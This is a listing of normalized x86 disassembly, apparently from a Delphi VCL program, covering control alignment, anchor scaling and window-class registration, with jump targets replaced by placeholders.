mov [ ebx + 0x162 ] al
mov [ ebx + 0x163 ] 0x2
mov [ ebx + 0x164 ] 0x1
mov [ ebx + 0x168 ] 0x1
mov [ ebx + 0x150 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43fa8b
lea eax [ ebp - 0x8 ]
call sub_403ef8
retn
sub_43fa8b
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_43fab0
push ebx
push esi
push edi
call sub_4034b0
mov ebx edx
mov edi eax
mov eax edi
call sub_41ad1c
cmp [ edi + 0x1a8 ] 0x0
je r-xdata
lea eax [ edi + 0x17c ]
call sub_405598
mov eax [ edi + 0x178 ]
call sub_403124
cmp [ edi + 0x30 ] 0x0
je r-xdata
mov [ edi + 0x1a8 ] 0x0
xor edx edx
mov eax edi
call sub_43b130
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov dl 0x1
mov eax edi
call sub_440750
mov eax edi
call sub_440990
test eax eax
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xac ]
mov eax [ edi + 0x170 ]
call sub_403124
mov eax [ edi + 0x18c ]
test eax eax
je r-xdata
mov edx eax
dec edx
mov eax edi
call sub_440954
mov esi eax
mov edx esi
mov eax edi
call sub_4407bc
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov eax edi
call sub_440990
test eax eax
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_43c65c
test bl bl
jle r-xdata
call sub_41bba4
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403498
sub_43fb80
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x19c ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ ebp - 0xc ] eax
xor ecx ecx
push ebp
push sub_43fc44
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_414300
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403124
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp edx [ ebp - 0x8 ]
jge r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
call sub_443e20
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_414108
mov edx [ eax + 0x1a0 ]
test edx edx
jl r-xdata
mov ecx eax
mov eax [ ebp - 0xc ]
call sub_414254
mov edx esi
mov eax [ ebp - 0xc ]
call sub_414108
test eax eax
je r-xdata
sub_43fc54
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4404f8
xor eax eax
push ebp
push sub_43fc94
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43c8c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43fc9b
mov eax [ ebp - 0x4 ]
call sub_440500
retn
sub_43fc9b
mov eax [ ebp - 0x4 ]
call sub_43fb80
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_441354
pop ebx
pop ecx
pop ebp
retn
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax [ ebp - 0x4 ]
call sub_43e62c
sub_43fcd0
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
xor ecx ecx
xor ebx ebx
mov bl [ ebp - 0x1 ]
cmp ebx 0x6
ja r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
jmp [ ebx * 4 + jump_table_43fceb ]
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp ecx edx
setle cl
jmp r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp ecx edx
setle cl
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x4 ]
xchg ecx eax
xchg ecx edx
mov ebx [ eax ]
call [ ebx + 0xa4 ]
mov ecx eax
sub_43fd5c
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x30 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x90 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp - 0x5 ]
mov al [ eax + rw-data ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x61 ]
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x94 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_443f64
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov al [ ebp - 0x5 ]
add al 0xfd
sub al 0x2
jb r-xdata
lea ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x30 ]
mov edx [ ebx + 0x4c ]
mov eax [ ebx + 0x48 ]
call sub_412cac
lea edx [ ebp - 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov al [ ebp - 0x5 ]
dec eax
sub al 0x2
jb r-xdata
sub al 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push sub_4400dd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4400e4
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
jmp [ eax * 4 + jump_table_43fff2 ]
sub al 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x88 ]
push eax
call MulDiv
mov edx [ ebp - 0x14 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
sub [ eax + 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xa8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] eax
xor eax eax
mov al [ ebp - 0x5 ]
cmp eax 0x6
ja r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
je r-xdata
sub eax edx
mov [ ebp - 0xc ] eax
adc edx 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push sub_43ff55
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
push eax
call MulDiv
mov edx [ ebp - 0x18 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x10 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x18 ] edx
jmp r-xdata
sub eax edx
mov [ ebp - 0x10 ] eax
adc edx 0x0
sub_4400e4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
xor edx edx
mov dl [ ebp - 0x5 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
cmp edx [ ebp - 0x18 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_440113 ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
sub_44019c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_440990
dec eax
test eax eax
jl r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp bl [ eax + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_413fac
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] bl
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_414108
lea ecx [ ebp - 0x18 ]
mov edx ebx
call sub_43fd5c
pop ecx
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_440954
mov edi eax
cmp bl [ edi + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp edi [ eax - 0x10 ]
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
xor esi esi
jmp r-xdata
mov eax [ r-xdata ]
and eax [ edi + 0x50 ]
mov edx [ r-xdata ]
cmp edx eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp esi [ eax + 0x8 ]
jge r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov ecx edi
mov edx esi
call sub_414184
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx esi
call sub_414108
mov edx eax
mov ecx ebx
mov eax edi
call sub_43fcd0
pop ecx
test al al
je r-xdata
test [ edi + 0x51 ] 0x4
jne r-xdata
inc esi
sub_44030c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov bl 0x1
mov eax [ edi ]
call sub_440990
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ edi ]
mov edx esi
call sub_440954
cmp [ eax + 0x5b ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ edi ]
mov edx esi
call sub_440954
mov dl [ r-xdata ]
cmp dl [ eax + 0x61 ]
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_440360
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
push ebp
call sub_44030c
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44043f
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_44019c
pop ecx
push ebp
mov al 0x2
call sub_44019c
pop ecx
push ebp
mov al 0x3
call sub_44019c
pop ecx
push ebp
mov al 0x4
call sub_44019c
pop ecx
push ebp
mov al 0x5
call sub_44019c
pop ecx
push ebp
mov al 0x6
call sub_44019c
pop ecx
push ebp
xor eax eax
call sub_44019c
pop ecx
mov eax [ ebp - 0x4 ]
mov si 0xffc7
call sub_403320
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403124
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov si 0xffee
call sub_403320
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x2c ]
sub_440464
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_443f64
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x160 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4404f8
xor eax eax
push ebp
push sub_4404eb
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x90 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_440500
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x10
jmp r-xdata
sub_440528
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4405ed
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_43ce88
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_440990
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4405f4
mov eax [ ebp - 0xc ]
call sub_403124
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_440954
mov edx eax
mov eax [ ebp - 0xc ]
call sub_413fac
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_43cbf4
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_414108
xor ecx ecx
mov edx 0xb03e
call sub_43e62c
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_440954
mov edi eax
mov eax [ edi + 0x4 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x4 ]
jne r-xdata
sub_4405fc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_440990
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f4
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_4404f8
xor edx edx
push ebp
push sub_4406e3
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_440990
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffc0
call sub_403320
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
jmp r-xdata
inc edi
xor ebx ebx
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
test ebx ebx
jg r-xdata
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_440954
mov edx eax
mov eax [ ebp - 0xc ]
call sub_413fac
mov edx ebx
dec edx
mov eax [ ebp - 0xc ]
call sub_414108
cmp [ eax + 0x5b ] 0x3
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_403124
mov eax [ ebp - 0x4 ]
call sub_440500
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_440954
mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
mov dl 0x3
call sub_43c998
mov dl 0x4
call sub_43c998
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x8 ]
dec edx
mov eax [ ebp - 0xc ]
call sub_413ff8
sub_440750
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_454618
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
call sub_45833c
sub_440770
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_43bd78
lea eax [ esi + 0x19c ]
mov edx ebx
call sub_43bd78
lea eax [ esi + 0x194 ]
mov edx ebx
call sub_43bd78
jmp r-xdata
mov [ ebx + 0x30 ] esi
sub_4407bc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_43bda0
lea eax [ esi + 0x194 ]
mov edx ebx
call sub_43bda0
lea eax [ esi + 0x19c ]
mov edx ebx
call sub_43bda0
jmp r-xdata
xor eax eax
mov [ ebx + 0x30 ] eax
pop esi
pop ebx
retn
sub_440804
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_403320
push 0x1
mov esi ebx
mov ecx esi
mov edx 0xb02c
mov eax edi
call sub_43e62c
mov edx ebx
mov eax edi
call sub_440770
test [ ebx + 0x1c ] 0x2
jne r-xdata
push 0x1
mov ecx esi
mov edx 0xb036
mov eax edi
call sub_43e62c
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_43e62c
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_43e62c
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_43e62c
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_43e62c
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
mov eax edi
call sub_443f64
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax ebx
call sub_43e62c
mov eax edi
call sub_441354
jmp r-xdata
mov edx ebx
mov eax edi
call sub_440464
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4408d8
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
push 0x0
mov edi ebx
mov ecx edi
mov edx 0xb036
mov eax esi
call sub_43e62c
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b0
test al al
je r-xdata
mov eax esi
call sub_443f64
test al al
je r-xdata
mov dl 0x1
mov ebp ebx
mov eax ebp
call sub_440750
mov eax ebp
call sub_4411b8
jmp r-xdata
mov edx ebx
mov eax esi
call sub_4407bc
push 0x0
mov ecx edi
mov edx 0xb02c
mov eax esi
call sub_43e62c
mov eax esi
call sub_440520
pop ebp
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_43d8cc
sub_440954
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebx eax
mov ebp [ ebx + 0x198 ]
test ebp ebp
je r-xdata
xor esi esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
mov edx edi
sub edx esi
mov eax [ ebx + 0x19c ]
call sub_414108
mov edx edi
mov eax ebp
call sub_414108
jmp r-xdata
cmp esi edi
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4409b0
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esp ]
call sub_440990
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_440954
mov ebp eax
mov edx esi
mov eax [ ebp + 0x3c ]
call [ ebp + 0x38 ]
cmp [ esi + 0xc ] 0x0
jne r-xdata
sub_4409f0
add esp 0xfffffff0
movzx edx dx
mov [ esp ] edx
xor edx edx
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
call sub_4409b0
add esp 0x10
retn
sub_440a18
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ ebx + 0x34 ]
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
mov [ ebx + 0x34 ] edi
mov eax [ ebx + 0x24 ]
and eax 0xffffbf1f
or eax 0x3
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0x24 ]
push eax
push esi
push 0x0
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
